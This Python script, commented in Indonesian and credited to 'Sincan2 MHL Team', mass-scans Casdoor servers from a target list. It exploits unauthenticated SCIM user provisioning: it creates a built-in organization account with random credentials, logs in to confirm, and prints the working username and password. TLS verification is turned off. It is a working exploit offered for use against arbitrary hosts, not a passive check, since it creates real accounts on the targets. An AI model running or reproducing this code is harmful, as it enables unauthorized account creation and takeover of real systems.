#!/usr/bin/env python3
import requests
import argparse
import random
import string
import json
import urllib3
from termcolor import colored

# Menonaktifkan peringatan permintaan yang tidak aman
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Banner untuk skrip
BANNER = colored("""
  Sincan2
""", "magenta", attrs=["bold"])

BANNER += colored("\nMHL TEAM\n", "cyan", attrs=["bold"])
BANNER += colored("Dibuat oleh Sincan2 MHL Team\n", "green", attrs=["bold", "underline"])

def buat_string_acak(panjang=12):
    """Fungsi untuk menghasilkan string acak."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=panjang))

def pindai_target(url):
    """Fungsi untuk memindai satu target URL."""
    # Menghapus spasi atau karakter baris baru dari URL
    url = url.strip()
    if not url:
        return False

    # Secara otomatis menambahkan http:// jika tidak ada protokol yang ditentukan
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    print(colored(f"\n[*] Memindai target: {url}", "yellow"))

    nama_pengguna = buat_string_acak()
    kata_sandi = buat_string_acak()
    email = f"{nama_pengguna}@oast.fun"

    headers = {"Content-Type": "application/json"}

    # Daftar endpoint yang akan diuji
    endpoints = {
        "GET /scim/Users": {"method": "GET", "url": f"{url}/scim/Users"},
        "POST /scim/Users": {
            "method": "POST",
            "url": f"{url}/scim/Users",
            "data": json.dumps({
                "active": True,
                "displayName": "Admin",
                "emails": [{"value": email}],
                "password": kata_sandi,
                "nickName": nama_pengguna,
                "schemas": [
                    "urn:ietf:params:scim:schemas:core:2.0:User",
                    "urn:ietf:params:scim:schemas:extension:enterprise:2.0:User"
                ],
                "urn:ietf:params:scim:schemas:extension:enterprise:2.0:User": {"organization": "built-in"},
                "userName": nama_pengguna,
                "userType": "normal-user"
            })
        },
        "POST /api/login": {
            "method": "POST",
            "url": f"{url}/api/login",
            "data": json.dumps({
                "application": "app-built-in",
                "organization": "built-in",
                "username": nama_pengguna,
                "autoSignin": True,
                "password": kata_sandi,
                "signinMethod": "Password",
                "type": "login"
            })
        }
    }

    rentan = False

    for kunci, req in endpoints.items():
        try:
            # Mengirim permintaan GET atau POST
            if req["method"] == "GET":
                respons = requests.get(req["url"], headers=headers, verify=False, timeout=10)
            else:
                respons = requests.post(req["url"], headers=headers, data=req["data"], verify=False, timeout=10)

            # Memeriksa apakah respons menunjukkan kerentanan
            if respons.status_code in [200, 201]:
                if "urn:ietf:params:scim:schemas:core:2.0:User" in respons.text or "\"status\": \"ok\"" in respons.text:
                    print(colored("\n🔥[TARGET RENTAN DITEMUKAN]🔥", "red", attrs=["bold"]))
                    print(colored(f"➡️ Target: {req['url']}", "green", attrs=["bold"]))
                    print(colored(f"💚 Nama Pengguna: {nama_pengguna}", "cyan", attrs=["bold"]))
                    print(colored(f"💚 Kata Sandi: {kata_sandi}", "cyan", attrs=["bold"]))
                    print(colored("-" * 50, "yellow"))
                    rentan = True
                    break

        except requests.exceptions.RequestException:
            # Lewati jika terjadi kesalahan koneksi
            print(colored(f"[-] Gagal terhubung ke {url}. Target mungkin offline.", "red"))
            break

    if not rentan:
        print(colored(f"[-] Target {url} sepertinya tidak rentan.", "blue"))

    return rentan

def main():
    """Fungsi utama untuk menjalankan skrip."""
    parser = argparse.ArgumentParser(
        description="Skrip Pindai Casdoor. Gunakan --file atau argumen posisi untuk target.",
        epilog="Contoh: python pindai.py 4.201.155.100:8080 ATAU python pindai.py --file targets.txt"
    )
    # Argumen untuk target tunggal (posisional)
    parser.add_argument("url", nargs="?", help="URL/IP target tunggal untuk dipindai.")

    # Argumen untuk file yang berisi daftar target
    parser.add_argument("-f", "--file", help="File teks yang berisi daftar URL/IP target.")

    args = parser.parse_args()

    print(BANNER)

    if args.url:
        # Opsi 1: Memindai URL tunggal dari argumen
        pindai_target(args.url)
    elif args.file:
        # Opsi 2: Memindai daftar URL dari file
        try:
            with open(args.file, "r") as f:
                targets = f.readlines()
                if not targets:
                    print(colored("[!] File target kosong.", "red"))
                    return
                for target in targets:
                    pindai_target(target)
        except FileNotFoundError:
            print(colored(f"[!] Error: File '{args.file}' tidak ditemukan.", "red"))
    else:
        # Jika tidak ada argumen yang diberikan
        parser.print_help()

if __name__ == "__main__":
    main()
